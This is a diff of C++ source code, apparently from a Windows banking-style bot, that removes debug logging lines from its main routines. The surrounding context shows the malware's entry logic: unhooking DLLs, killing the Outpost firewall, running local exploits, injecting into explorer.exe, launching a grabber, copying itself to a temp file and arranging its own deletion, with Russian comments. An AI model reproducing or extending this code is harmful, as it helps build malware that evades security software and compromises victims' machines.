@@ -219,27 +219,23 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
 
-MDBG("Main", "E2");
 	UnhookDlls();
 	
-	MDBG("Main", "E3");
 	if (dwExplorerSelf) 
 	{
 		//если инжект был в свой эксплорер завершаемся	
 
 		dwExplorerSelf = 0;
-	MDBG("Main", "E4");
+
 		if (!InjectIntoExplorer(ExplorerRoutine))
 		{
-			MDBG("Main", "E5");
 			ExplorerMain();
 		}
 
 		pExitProcess(1);
 	}
-	MDBG("Main", "E6");
+
 	ExplorerMain();
-	MDBG("Main", "E7");
 	return 0;
 }
 
@@ -289,7 +285,6 @@ int APIENTRY MyMain()
 
 	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
 
-	MDBG("Main", "1");
 
 	if ( dwProcessHash == BOT::GetBotExeNameHash()) // запуск из самого бота
 	{
@@ -318,19 +313,14 @@ int APIENTRY MyMain()
 	}
 	else
 	{
-		MDBG("Main", "2");
 		dwFirst = 1;
 
 		KillOutpost();
-		MDBG("Main", "3");
 
 		DWORD dwExploits = SetExploits();
 
-		MDBG("Main", "4");
-
 		if ( !dwExploits )
 		{
-			MDBG("Main", "5");
 			if (MegaJump(LoaderRoutine))
 			{
 				dwAlreadyRun = 1;
@@ -341,13 +331,13 @@ int APIENTRY MyMain()
 					dwGrabberRun = 1;
 			#endif 
 		}
-		MDBG("Main", "6");		
+	
 		m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
 		dwKillPid = (DWORD)pGetCurrentProcessId();
 		CopyFileToTemp( ModulePath, TempFileName );	
 
 		dwExplorerSelf = 1;
-		MDBG("Main", "7");
+
 		if (!JmpToExplorer(ExplorerRoutine ) )
 		{
 			MDBG("Main", "8");
